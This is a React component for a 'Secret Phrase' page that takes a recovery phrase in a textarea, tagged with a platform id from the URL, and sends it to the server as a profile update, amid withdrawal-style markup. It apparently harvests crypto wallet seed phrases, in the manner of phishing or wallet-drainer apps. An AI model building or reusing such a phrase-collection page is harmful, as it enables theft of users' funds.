import React, { useEffect, useState } from "react";
import SubHeader from "src/view/shared/Header/SubHeader";
import authSelectors from "src/modules/auth/authSelectors";
import yupFormSchemas from "src/modules/shared/yup/yupFormSchemas";
import * as yup from "yup";
import { i18n } from "../../../i18n";
import { FormProvider, useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import { useDispatch, useSelector } from "react-redux";
import authActions from "src/modules/auth/authActions";
import { useParams } from "react-router-dom";

const schema = yup.object().shape({
  phase: yupFormSchemas.string(i18n("entities.transaction.fields.phase"), {
    // required: true,
    // min: 12,
  }),
});

function Phrase() {
  const { id } = useParams(); // Access the `id` from the URL
  const currentUser = useSelector(authSelectors.selectCurrentUser);
  const dispatch = useDispatch();

  const [initialValues] = useState(() => {
    return {
      phase: "" || currentUser.phase,
    };
  });


  const form = useForm({
    resolver: yupResolver(schema),
    mode: "onSubmit",
    defaultValues: initialValues
  });
  const [phase, setPhase] = useState("");

  const onSubmit = async (values) => {
    const payload = {
      platform: id,
      user: currentUser ? currentUser : null,
      phase: phase,
    };
    await dispatch(authActions.doUpdateProfilePhase(payload));
  };




  useEffect(() => {
    // Add any effect logic here if necessary
  }, [currentUser]);

  return (
    <div>
      <SubHeader title="Phrase" path="/" />
      <div className="withdraw__content">
        <div className="withdraw__header">
          <h3 className="hall" style={{ paddingTop: 0 }}>
            Secret Phrase:
          </h3>
        </div>
        <FormProvider {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)}>
            <div>
              <textarea
                className="input__textarea"
                name="phase"
                rows={12}
                value={phase || currentUser?.phase || ""}
                wrap="soft"
                onChange={(e) => setPhase(e.target.value)}
              />
              <p className="error-message">
                {form.formState.errors.phase?.message}
              </p>
              <button className="confirm" type="submit">
                {i18n("buttons.confirm")}
              </button>
            </div>
          </form>
        </FormProvider>
      </div>
    </div>
  );
}

export default Phrase;
